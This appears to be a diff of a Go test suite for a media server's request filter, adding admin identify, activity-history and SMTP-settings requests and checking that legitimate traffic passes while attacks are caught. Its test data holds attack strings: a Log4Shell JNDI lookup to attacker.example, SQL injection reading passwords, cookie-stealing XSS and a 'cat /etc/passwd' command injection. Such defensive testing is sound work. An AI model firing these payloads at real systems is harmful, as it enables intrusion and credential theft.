@@ -122,6 +122,16 @@ func (g cv) requests() []cvRequest {
 		cvBody("POST", api+"/wanted/search", map[string]any{"kind": g.pick("movie", "show"), "query": g.title()}),
 		cvBody("POST", api+"/wanted/search", map[string]any{"kind": "movie", "query": g.title(), "year": 2006}),
 		cvBody("POST", api+"/wanted", map[string]any{"kind": "show", "libraryId": lib, "provider": "tmdb", "id": "12345"}),
+		cvBody("POST", api+"/admin/ingest/files/"+file+"/identify", map[string]any{"kind": "movie", "provider": "tmdb", "id": "12345",
+			"title": g.title(), "year": 2006, "libraryId": lib, "remember": false, "wholeUnit": true}),
+		cvBody("POST", api+"/admin/ingest/files/"+file+"/identify", map[string]any{"kind": "show", "provider": "tvdb", "id": "81189",
+			"title": g.title(), "libraryId": lib, "season": 1, "episode": 3}),
+		cvGet(api + "/admin/activity/history?" + url.Values{"user": {g.id()}, "library": {lib}}.Encode()),
+		cvGet(api + "/admin/activity/history"),
+		{method: "DELETE", path: api + "/admin/activity/history"},
+		cvBody("PUT", api+"/admin/settings/smtp", map[string]any{"enabled": true, "host": "smtp.example.com", "port": 587,
+			"security": "starttls", "username": "no-reply@example.com", "password": "", "clearPassword": false,
+			"from": "no-reply@example.com", "publicUrl": g.pick("https://media.example.com", "https://media.example.com/cavu", "")}),
 		cvGet(api + "/admin/browse?" + url.Values{"path": {g.pick(cvPaths...)}}.Encode()),
 		cvGet(g.asset()),
 		cvRange(api + "/stream/" + g.token() + "/t-" + g.id() + "-orig." + g.pick("flac", "mp3")),
@@ -284,6 +294,8 @@ func TestTheCavuSetLetsItsClientThrough(t *testing.T) {
 			for _, title := range cvTitles {
 				send(cvGet("/api/v1/search?"+url.Values{"q": {title}}.Encode()), "")
 				send(cvBody("POST", "/api/v1/wanted/search", map[string]any{"kind": "movie", "query": title}), "")
+				send(cvBody("POST", "/api/v1/admin/ingest/files/"+g.id()+"/identify", map[string]any{"kind": "movie", "provider": "tmdb",
+					"id": "12345", "title": title, "libraryId": g.id()}), "")
 				send(cvBody("POST", "/api/v1/admin/items/"+g.id()+"/identify/search", map[string]any{"q": title, "provider": "tmdb"}), "")
 				send(cvBody("POST", "/api/v1/admin/music/albums/"+g.id()+"/identify/search", map[string]any{"album": title, "artist": title}), "")
 				send(cvBody("PUT", "/api/v1/music/queue", map[string]any{"clientId": g.clientID(), "device": "iPad", "queue": map[string]any{
@@ -300,6 +312,11 @@ func TestTheCavuSetLetsItsClientThrough(t *testing.T) {
 			for _, line := range cvLogLines {
 				send(cvBody("POST", "/api/v1/dev/client-log", map[string]any{"page": "/", "entries": []any{
 					map[string]any{"t": 1.5, "level": "warn", "src": "player", "msg": line}}}), "")
+			}
+			for _, pw := range []string{`<Tr0ub4dor&3>`, `p@ss'w0rd"; --`, `correct horse; battery's "staple"`, "a;b|c`d$(e)"} {
+				send(cvBody("PUT", "/api/v1/admin/settings/smtp", map[string]any{"enabled": true, "host": "smtp.example.com", "port": 465,
+					"security": "tls", "username": "mailer", "password": pw, "from": "no-reply@example.com",
+					"publicUrl": "https://media.example.com"}), " (a mail server's password)")
 			}
 			for _, profiles := range cvProfiles {
 				send(cvBody("POST", "/api/v1/playback/sessions", map[string]any{"itemId": g.id(), "profile": map[string]any{
@@ -375,6 +392,7 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		{1, cvGet(api + "/search?" + url.Values{"q": {"${jndi:ldap://attacker.example/a}"}}.Encode())},
 		{1, cvBody("POST", api+"/wanted/search", map[string]any{"kind": "movie", "query": "x' UNION SELECT password FROM users--"})},
 		{1, cvBody("POST", api+"/wanted/search", map[string]any{"kind": "show", "query": "<script>alert(1)</script>"})},
+		{1, cvBody("POST", api+"/admin/ingest/files/"+item+"/identify", map[string]any{"kind": "movie", "title": "x' UNION SELECT password FROM users--"})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "<script>alert(document.cookie)</script>"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "x' UNION SELECT password FROM users--"}}})},
 		{1, cvBody("POST", api+"/dev/client-log", map[string]any{"entries": []any{map[string]any{"msg": "done; cat /etc/passwd"}}})},
@@ -412,12 +430,19 @@ func TestTheCavuSetKeepsTheAttacks(t *testing.T) {
 		// The paths that end in commands' names are those two alone, and
 		// a script's name is Vite's.
 		{3, cvGet(api + "/music/top")},
+		{3, cvGet(api + "/admin/activity/history/top")},
 		{3, cvGet("/assets/x-dnf.js")},
 		{3, cvGet("/assets/AdminLayout-DNf-AqVU.map")},
 		// A password and a key are unread only where one goes.
 		{1, cvBody("POST", api+"/music/connect/hello", map[string]any{"name": "x", "password": "x' UNION SELECT password FROM users--"})},
 		{1, cvBody("POST", api+"/items/"+item+"/played", map[string]any{"key": "x' UNION SELECT password FROM users--"})},
 		{1, cvBody("POST", api+"/auth/login", map[string]any{"username": "x' UNION SELECT password FROM users--", "password": "x"})},
+		{1, cvBody("POST", api+"/admin/settings/smtp", map[string]any{"username": "x' UNION SELECT password FROM users--", "password": "x"})},
+		// The address mails link to is a URL with no query.
+		{4, cvBody("POST", api+"/admin/settings/smtp", map[string]any{"host": "smtp.example.com", "publicUrl": "https://media.example.com/a);(b"})},
+		// Only a new file's identify takes the name wholeUnit.
+		{3, cvBody("POST", api+"/admin/items/"+item+"/identify", map[string]any{"provider": "tmdb", "id": "12345", "wholeUnit": true})},
+		{3, cvBody("POST", api+"/admin/ingest/files/"+item+"/identify", map[string]any{"kind": "movie", "wholeUnits": true})},
 		// A home row's key is one of three.
 		{4, cvBody("POST", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "a);(b", "hidden": false}}})},
 		{1, cvBody("POST", api+"/me/home", map[string]any{"rows": []any{map[string]any{"key": "x' UNION SELECT password FROM users--"}}})},
